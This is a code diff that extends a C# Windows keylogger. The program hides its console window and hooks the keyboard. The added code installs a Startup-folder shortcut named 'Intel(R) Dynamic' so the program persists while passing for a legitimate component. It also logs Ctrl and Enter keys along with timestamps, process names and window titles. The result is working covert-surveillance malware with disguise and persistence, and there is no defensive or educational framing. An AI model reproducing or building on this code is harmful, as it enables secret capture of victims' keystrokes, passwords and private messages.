@@ -6,6 +6,9 @@ using System.IO;
 using System.Threading.Tasks;
 using System.Reflection.Emit;
 using System.Threading;
+using Microsoft.Win32;
+using System.Reflection;
+using IWshRuntimeLibrary;
 
 class InterceptKeys
 {
@@ -17,9 +20,14 @@ class InterceptKeys
     private const int IdleThreshold = 2000; // 2 sekundy
     private static IntPtr previousForegroundWindowHandle;
 
+    [STAThread]
     public static void Main()
     {
         var handle = GetConsoleWindow();
+
+        //string batchScriptPath = Application.StartupPath + @"\startup.bat";
+        //ExecuteBatchScript(batchScriptPath);
+        CreateShortcut();
 
         ShowWindow(handle, SW_HIDE);
 
@@ -31,6 +39,34 @@ class InterceptKeys
         Application.Run();
 
         UnhookWindowsHookEx(_hookID);
+    }
+
+    static void CreateShortcut()
+    {
+        // Specify the name of your application
+        string appName = "Intel(R) Dynamic";
+
+        // Get the path to the Autostart folder for the current user
+        string autostartFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{appName}.lnk");
+
+        // Check if the shortcut already exists
+        if (!System.IO.File.Exists(autostartFolderPath))
+        {
+            // Create a shortcut to the application executable
+            string appPath = Assembly.GetEntryAssembly().Location;
+
+            // Create a WshShellClass instance
+            WshShell shell = new WshShell();
+
+            // Create a new shortcut
+            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(autostartFolderPath);
+
+            // Set the target path
+            shortcut.TargetPath = appPath;
+
+            // Save the shortcut
+            shortcut.Save();
+        }
     }
 
     private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -57,6 +93,7 @@ class InterceptKeys
                 case Keys.Up: return "|UP|";
                 case Keys.Right: return "|RIGHT|";
                 case Keys.Down: return "|DOWN|";
+                case Keys.Return: return "|Return|";
                 case Keys.D1: return "!";
                 case Keys.D2: return "@";
                 case Keys.D3: return "#";
@@ -90,6 +127,7 @@ class InterceptKeys
                 case Keys.Up: return "|UP|";
                 case Keys.Right: return "|RIGHT|";
                 case Keys.Down: return "|DOWN|";
+                case Keys.Return: return "|ENTER|";
                 case Keys.D1: return "1";
                 case Keys.D2: return "2";
                 case Keys.D3: return "3";
@@ -122,6 +160,7 @@ class InterceptKeys
     private static string Parse(int key, bool alt)
     {
         bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;
+    bool ctrlKey = (Control.ModifierKeys & Keys.Control) != 0;
 
         char keyChar = (char)key;
 
@@ -153,7 +192,11 @@ class InterceptKeys
             char caseSensitiveChar = shiftKey ? char.ToUpper(keyChar) : char.ToLower(keyChar);
 
             finalResult = caseSensitiveChar.ToString();
-            return finalResult;
+
+            if (ctrlKey)
+            {
+                finalResult = " |CTRL+" + finalResult + "| ";
+            }
         }
 
         return finalResult;
@@ -204,9 +247,17 @@ class InterceptKeys
             string windowTitle = new string(' ', nChars);
             GetWindowText(currentForegroundWindowHandle, windowTitle, nChars);
 
+            DateTime currentDateAndTime = DateTime.Now;
+
             sw.WriteLine();
+
+            sw.WriteLine();
+            sw.WriteLine();
+            sw.WriteLine($"[Time: {currentDateAndTime}]");
             sw.WriteLine($"[Process Name: {currentProcess?.ProcessName}, Window Title: {windowTitle.Trim()}]");
             rawSw.WriteLine();
+            rawSw.WriteLine();
+            rawSw.WriteLine($"[Time: {currentDateAndTime}]");
             rawSw.WriteLine($"[Process Name: {currentProcess?.ProcessName}, Window Title: {windowTitle.Trim()}]");
 
             sw.Close();
